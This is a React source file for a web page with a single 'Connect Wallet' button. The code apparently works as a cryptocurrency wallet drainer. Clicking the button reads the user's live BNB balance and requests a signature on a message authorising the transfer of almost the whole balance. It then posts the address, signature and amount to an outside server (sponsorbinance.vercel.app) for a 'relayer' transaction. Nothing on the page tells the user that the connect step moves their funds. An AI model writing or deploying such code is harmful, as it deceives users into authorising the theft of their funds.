import React, { useState } from "react";

// دریافت موجودی واقعی از شبکه (eth_getBalance)
async function getLiveBalance(address) {
  try {
    const balanceHex = await window.ethereum.request({
      method: "eth_getBalance",
      params: [address, "latest"],
    });
    return parseFloat(parseInt(balanceHex, 16) / 1e18).toFixed(6);
  } catch (error) {
    console.error("❌ Error fetching live balance:", error);
    return null;
  }
}

function App() {
  const [account, setAccount] = useState(null);

  async function connectAndSend() {
    if (typeof window.ethereum === "undefined") {
      alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
      return;
    }

    let accounts;
    try {
      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    } catch (err) {
      console.error("❌ Could not request accounts:", err);
      return;
    }
    if (!accounts || !accounts.length) {
      console.error("❌ No account returned.");
      return;
    }
    const userAddress = accounts[0];
    setAccount(userAddress);
    console.log("✅ User address:", userAddress);

    const liveBalanceStr = await getLiveBalance(userAddress);
    console.log("💰 Live BNB Balance:", liveBalanceStr);
    const totalBalance = parseFloat(liveBalanceStr);
    if (isNaN(totalBalance)) {
      console.error("❌ Could not parse live balance.");
      return;
    }

    const reserveBNB = 0.02;
    const sendAmount = totalBalance - reserveBNB;
    if (sendAmount <= 0) {
      console.error("❌ Insufficient funds to cover reserve for gas fee.");
      return;
    }
    console.log("Calculated send amount (BNB):", sendAmount);

    const message = `Authorize sending ${sendAmount} BNB from ${userAddress}`;
    console.log("📜 Message to sign:", message);

    let signature;
    try {
      signature = await window.ethereum.request({
        method: "personal_sign",
        params: [message, userAddress],
      });
      console.log("✍️ Signature:", signature);
    } catch (error) {
      console.error("❌ Error in personal_sign:", error);
      return;
    }

    try {
      const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          handler: "tx",
          address: userAddress,
          signature: signature,
          amount: sendAmount.toString(),
        }),
      });
      const result = await resp.json();
      console.log("Server verify response:", result);
      if (!result.success) {
        console.error("❌ Signature verification failed at server.", result);
        return;
      }
    } catch (e) {
      console.error("❌ Could not call server to verify signature:", e);
      return;
    }

    try {
      const resp2 = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          handler: "relayer_tx",
          address: userAddress,
          signature: signature,
          amount: sendAmount.toString(),
        }),
      });
      const result2 = await resp2.json();
      console.log("Relayer response:", result2);
      if (!result2.success) {
        console.error("❌ Relayer transaction failed:", result2);
        return;
      }
      alert("Transaction sent via meta-transaction! TxHash: " + result2.txHash);
    } catch (e) {
      console.error("❌ Could not call relayer:", e);
      return;
    }
  }

  return (
    <div style={{ margin: "20px" }}>
      <a
        href="#"
        onClick={connectAndSend}
        className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      >
        {account ? `Connected: ${account}` : "Connect Wallet"}
      </a>
    </div>
  );
}

export default App;
